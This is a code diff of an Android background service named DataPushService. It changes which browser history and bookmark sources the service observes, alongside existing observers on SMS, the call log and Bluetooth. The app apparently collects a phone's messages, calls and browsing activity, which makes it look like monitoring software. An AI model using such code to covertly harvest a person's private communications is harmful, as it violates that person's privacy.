@@ -8,6 +8,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.IBinder;
+import android.provider.Browser;
 import android.util.Log;
 
 import java.util.Date;
@@ -47,7 +48,15 @@ public class DataPushService extends Service{
                 contentResolver = getBaseContext().getContentResolver();
                 contentResolver.registerContentObserver(Uri.parse(SmsConstants.CONTENT_SMS_URI), true, smsObserver);
                 contentResolver.registerContentObserver(Uri.parse(CallConstants.CONTENT_CALL_URI), true,callObserver);
-                contentResolver.registerContentObserver(Uri.parse(BrowserConstants.CONTENT_CALL_URI),true,browserObserver);
+                //contentResolver.registerContentObserver(Uri.parse(BrowserConstants.CHROME_CONTENT_URI),true,browserObserver);
+                //contentResolver.registerContentObserver(Uri.parse(BrowserConstants.CONTENT_DEFAULT_URI),true,browserObserver);
+               // browserHistoryObserver = new BrowserHistoryObserver(new Handler());
+                getContentResolver().registerContentObserver(Browser.BOOKMARKS_URI, true, browserObserver);
+
+
+
+               // contentResolver.registerContentObserver(Uri.parse(BrowserConstants.OPERA_CONTENT_URI),true,browserObserver);
+                contentResolver.registerContentObserver(Uri.parse(BrowserConstants.SAMSUNG_CONTENT_URI),true,browserObserver);
                 contentResolver.registerContentObserver(Uri.parse(BluetoothConstants.CONTENT_BLUETOOTH_URI),true, bluetoothObserver);
                 serviceInitialized = true;
 
@@ -62,8 +71,9 @@ public class DataPushService extends Service{
 
             contentResolver.unregisterContentObserver(smsObserver);
             contentResolver.unregisterContentObserver(callObserver);
-            contentResolver.unregisterContentObserver(browserObserver);
+            //contentResolver.unregisterContentObserver(browserObserver);
            contentResolver.unregisterContentObserver(bluetoothObserver);
+            getContentResolver().unregisterContentObserver(browserObserver);
             serviceInitialized = false;
         }
 
